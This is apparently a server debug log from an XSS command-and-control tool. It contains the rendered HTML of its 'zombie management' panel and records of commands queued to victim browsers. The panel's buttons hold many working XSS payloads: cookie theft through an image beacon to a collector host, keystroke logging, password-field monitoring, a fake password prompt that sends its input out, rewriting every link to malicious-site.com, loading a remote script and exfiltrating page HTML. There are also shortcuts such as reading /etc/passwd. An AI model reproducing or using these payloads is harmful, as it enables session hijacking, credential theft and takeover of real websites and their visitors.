if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n<!-- 添加彈出視窗的CSS樣式 -->\n<style>\n    .result-modal {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        background-color: rgba(0, 0, 0, 0.5);\n        z-index: 1000;\n        display: none;\n    }\n\n    .modal-content {\n        position: relative;\n        background-color: white;\n        margin: 2% auto;\n        padding: 0;\n        width: 90%;\n        max-width: 800px;\n        max-height: 90vh;\n        overflow-y: auto;\n        border-radius: 8px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n\n    .modal-header {\n        background-color: #343a40;\n        color: white;\n        padding: 15px 20px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 8px 8px 0 0;\n    }\n\n    .modal-header h3 {\n        margin: 0;\n        font-size: 1.2em;\n    }\n\n    .close-modal {\n        background: none;\n        border: none;\n        color: white;\n        font-size: 24px;\n        cursor: pointer;\n        padding: 0;\n        width: 30px;\n        height: 30px;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n    }\n\n    .close-modal:hover {\n        background-color: rgba(255, 255, 255, 0.2);\n        border-radius: 50%;\n    }\n\n    .modal-body {\n        padding: 20px;\n    }\n\n    .info-section {\n        margin-bottom: 25px;\n        border: 1px solid #e9ecef;\n        border-radius: 6px;\n        overflow: hidden;\n    }\n\n    .info-section h4 {\n        background-color: #f8f9fa;\n        margin: 0;\n        padding: 12px 15px;\n        border-bottom: 1px solid #e9ecef;\n        font-size: 1em;\n    }\n\n    .info-content {\n        padding: 15px;\n    }\n\n    .reg-info p {\n        margin: 8px 0;\n        word-break: break-all;\n    }\n\n    .results-container {\n        max-height: 400px;\n        overflow-y: auto;\n    }\n\n    .result-item {\n        border: 1px solid #dee2e6;\n        border-radius: 4px;\n        margin-bottom: 10px;\n        padding: 12px;\n    }\n\n    .result-item.success {\n        border-left: 4px solid #28a745;\n        background-color: #f8fff9;\n    }\n\n    .result-item.error {\n        border-left: 4px solid #dc3545;\n        background-color: #fff8f8;\n    }\n\n    .result-header {\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        margin-bottom: 8px;\n    }\n\n    .result-status {\n        font-weight: bold;\n    }\n\n    .result-time {\n        color: #6c757d;\n        font-size: 0.9em;\n    }\n\n    .result-command,\n    .result-output,\n    .result-error {\n        margin: 8px 0;\n    }\n\n    .result-command code {\n        background-color: #f8f9fa;\n        padding: 2px 4px;\n        border-radius: 3px;\n        font-family: \'Courier New\', monospace;\n    }\n\n    .result-output pre,\n    .result-error pre {\n        background-color: #f8f9fa;\n        border: 1px solid #e9ecef;\n        border-radius: 4px;\n        padding: 10px;\n        margin: 5px 0;\n        white-space: pre-wrap;\n        word-wrap: break-word;\n        font-family: \'Courier New\', monospace;\n        font-size: 0.9em;\n        max-height: 200px;\n        overflow-y: auto;\n    }\n\n    .result-error pre {\n        background-color: #fff5f5;\n        border-color: #fed7d7;\n        color: #c53030;\n    }\n\n    .no-results {\n        text-align: center;\n        color: #6c757d;\n        font-style: italic;\n        padding: 20px;\n    }\n\n    .result-btn {\n        background-color: #17a2b8 !important;\n    }\n\n    .result-btn:hover {\n        background-color: #138496 !important;\n    }\n\n    .zombie-actions {\n        display: flex;\n        gap: 8px;\n    }\n\n    .action-btn {\n        flex: 1;\n        padding: 6px 12px;\n        font-size: 0.85em;\n    }\n</style>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 22:34:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:34:38] "GET /api/control/get_messages?tab=zombies HTTP/1.1" 200 -
2025-06-26 22:34:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:34:38] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-26 22:34:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:34:38] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:34:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-26 22:34:40 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-26 22:34:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-26 22:34:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:34:40] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-26 22:35:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_command_to_do(zombie_ip='127.0.0.1')
2025-06-26 22:35:53 | INFO     | control_route.py:200 | add_command_to_do() | 用戶請求為殭屍機器 127.0.0.1 添加命令
2025-06-26 22:35:53 | INFO     | control_route.py:218 | add_command_to_do() | 成功為殭屍機器 127.0.0.1 添加命令: var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();
2025-06-26 22:35:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_command_to_do 執行完畢 (耗時: 0.0050s) -> 回傳: <Response 374 bytes [200 OK]>
2025-06-26 22:35:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:35:53] "POST /api/control/add_command_to_do/127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:36:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-26 22:36:24 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-26 22:36:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 4313 bytes [200 OK]>
2025-06-26 22:36:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:24] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-26 22:36:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:36:24 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-26 22:36:24 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","hostname":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-26T14:36:24.262Z"}', None, '2025-06-26 22:36:24.267695', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:36:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0023s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-26 22:36:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:24] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-26 22:36:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:36:24 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-26 22:36:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0009s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"></button>\n                    </div>\n                </div>\n                <label class="form-label">XSS載荷</label>\n                <div class="xss-payload">\n                    <!-- 基礎 XSS 載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(document.cookie)\')">查看Cookie</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var links = []; document.querySelectorAll(\\\'a\\\').forEach(function(a){ links.push(a.href); }); alert(links.join(\\\'\\\\n\\\'));\')">查看所有連結</button>\n\n                    <!-- 信息收集類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(\\\'頁面標題: \\\' + document.title + \\\'\\\\n當前URL: \\\' + window.location.href + \\\'\\\\nUser Agent: \\\' + navigator.userAgent)\')">基本信息收集</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var forms = []; document.querySelectorAll(\\\'form\\\').forEach(function(f, i){ forms.push(\\\'表單 \\\' + (i+1) + \\\': \\\' + f.action + \\\' (方法: \\\' + f.method + \\\')\\\'); }); alert(forms.join(\\\'\\\\n\\\') || \\\'無表單\\\')\')">查看所有表單</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var inputs = []; document.querySelectorAll(\\\'input\\\').forEach(function(inp){ if(inp.value) inputs.push(inp.name + \\\': \\\' + inp.value); }); alert(inputs.join(\\\'\\\\n\\\') || \\\'無輸入值\\\')\')">查看表單輸入值</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(\\\'LocalStorage: \\\' + JSON.stringify(localStorage) + \\\'\\\\nSessionStorage: \\\' + JSON.stringify(sessionStorage))\')">查看本地存儲</button>\n\n                    <!-- 鍵盤記錄類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var keys = []; document.addEventListener(\\\'keypress\\\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\\\'按鍵記錄: \\\' + keys.join(\\\'\\\')); keys = []; } });\')">啟動按鍵記錄</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'input[type=password]\\\').forEach(function(pwd){ pwd.addEventListener(\\\'input\\\', function(){ console.log(\\\'密碼輸入: \\\' + pwd.value); }); });\')">密碼欄位監控</button>\n\n                    <!-- 頁面操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.style.transform = \\\'rotate(180deg)\\\'; setTimeout(function(){ document.body.style.transform = \\\'rotate(0deg)\\\'; }, 3000);\')">翻轉頁面3秒</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.innerHTML = \\\'<h1 style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\\\';\')">替換頁面內容</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'setInterval(function(){ document.body.style.backgroundColor = [\\\'red\\\',\\\'blue\\\',\\\'green\\\',\\\'yellow\\\'][Math.floor(Math.random()*4)]; }, 500);\')">閃爍背景色</button>\n\n                    <!-- 網路請求類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'XSS測試成功 - 來自: \\\' + window.location.href, target_ip: window.location.hostname}) });\')">發送測試消息</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var img = new Image(); img.src = \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'XSS via Image - Cookie: \\\' + document.cookie) + \\\'&target_ip=\\\' + window.location.hostname;\')">通過圖片發送Cookie</button>\n\n                    <!-- 瀏覽器指紋收集 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var fingerprint = { screen: screen.width + \\\'x\\\' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name).join(\\\',\\\') }; alert(JSON.stringify(fingerprint, null, 2));\')">瀏覽器指紋</button>\n\n                    <!-- 社交工程類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var userInput = prompt(\\\'系統安全檢查：請輸入您的密碼以繼續\\\'); if(userInput) { fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'釣魚成功 - 密碼: \\\' + userInput, target_ip: window.location.hostname}) }); }\')">密碼釣魚</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'if(confirm(\\\'檢測到安全威脅！是否要下載安全補丁？\\\')) { alert(\\\'用戶同意下載，可以進行下一步攻擊\\\'); }\')">安全威脅詐騙</button>\n\n                    <!-- 持久性 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'localStorage.setItem(\\\'xss_payload\\\', \\\'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\\\'); eval(localStorage.getItem(\\\'xss_payload\\\'));\')">本地存儲持久化</button>\n\n                    <!-- DOM 操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var maliciousDiv = document.createElement(\\\'div\\\'); maliciousDiv.innerHTML = \\\'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\\\'; document.body.appendChild(maliciousDiv);\')">偽造錯誤覆蓋層</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'a\\\').forEach(function(link){ if(link.href.includes(\\\'http\\\')) { link.href = \\\'http://malicious-site.com/redirect?original=\\\' + encodeURIComponent(link.href); } });\')">劫持所有外部連結</button>\n\n                    <!-- 高級載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var script = document.createElement(\\\'script\\\'); script.src = \\\'http://127.0.0.1:8964/api/control/xss_payload\\\'; document.head.appendChild(script); })();\')">載入遠程腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var xhr = new XMLHttpRequest(); xhr.open(\\\'GET\\\', \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'完整頁面HTML: \\\' + document.documentElement.outerHTML.substring(0, 1000)) + \\\'&target_ip=\\\' + window.location.hostname); xhr.send();\')">竊取頁面HTML</button>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T13:59:59.791Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 21:59:59.793637</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n<!-- 添加彈出視窗的CSS樣式 -->\n<style>\n    .result-modal {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 